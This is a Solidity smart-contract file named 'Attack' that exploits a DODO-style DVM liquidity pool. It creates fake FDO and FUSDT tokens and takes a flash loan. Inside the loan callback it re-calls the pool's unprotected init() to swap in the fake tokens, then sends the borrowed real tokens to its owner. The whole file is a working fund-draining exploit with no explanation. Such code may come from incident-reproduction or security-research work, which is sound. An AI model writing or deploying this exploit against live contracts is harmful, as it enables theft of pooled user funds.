// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

//import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IDVM {
    function _MAINTAINER_() external view returns (address);

    function _MT_FEE_RATE_MODEL_() external view returns (address);

    function getVaultReserve()
        external
        view
        returns (uint256 baseReserve, uint256 quoteReserve);

    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;

    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;
}

interface IERC20Factory {
    function createStdERC20(
        uint256 totalSupply,
        string memory name,
        string memory symbol,
        uint256 decimals
    ) external returns (address newERC20);
}

contract Attack {
    using SafeERC20 for IERC20;
    address owner;
    address constant erc20Factory =
        address(0x44D5dF24d5Ef52A791D6436Fa45A8D426f6de34e);
    address dvm;
    address fdo;
    address fusdt;

    constructor() {
        owner = msg.sender;
    }

    function trigger(
        address _tokenA,
        address _tokenB,
        uint baseAmount,
        uint quoteAmount
    ) external {
        require(msg.sender == owner, "Not your biz");

        IERC20 tokenA = IERC20(_tokenA);
        IERC20 tokenB = IERC20(_tokenB);
        (uint256 baseReserve, uint256 quoteReserve) = IDVM(dvm)
            .getVaultReserve();
        IERC20(fdo).safeTransfer(dvm, baseReserve);
        IERC20(fusdt).safeTransfer(dvm, quoteReserve);

        IDVM(dvm).flashLoan(baseAmount, quoteAmount, address(this), "1");

        // collect the funds
        tokenA.safeTransfer(msg.sender, tokenA.balanceOf(address(this)));
        tokenB.safeTransfer(msg.sender, tokenB.balanceOf(address(this)));
    }

    function prepare(address _dvm) external {
        require(msg.sender == owner, "Not your biz");

        dvm = _dvm;
        fdo = IERC20Factory(erc20Factory).createStdERC20(
            1e29,
            "FDO",
            "FDO",
            18
        );
        fusdt = IERC20Factory(erc20Factory).createStdERC20(
            1e17,
            "FUSDT",
            "FUSDT",
            6
        );
    }

    function DVMFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        address maintainer = IDVM(dvm)._MAINTAINER_();
        address mtFeeRateModel = IDVM(dvm)._MT_FEE_RATE_MODEL_();

        IDVM(dvm).init(
            maintainer,
            fdo,
            fusdt,
            3000000000000000,
            mtFeeRateModel,
            1,
            1000000000000000000,
            false
        );
    }
}
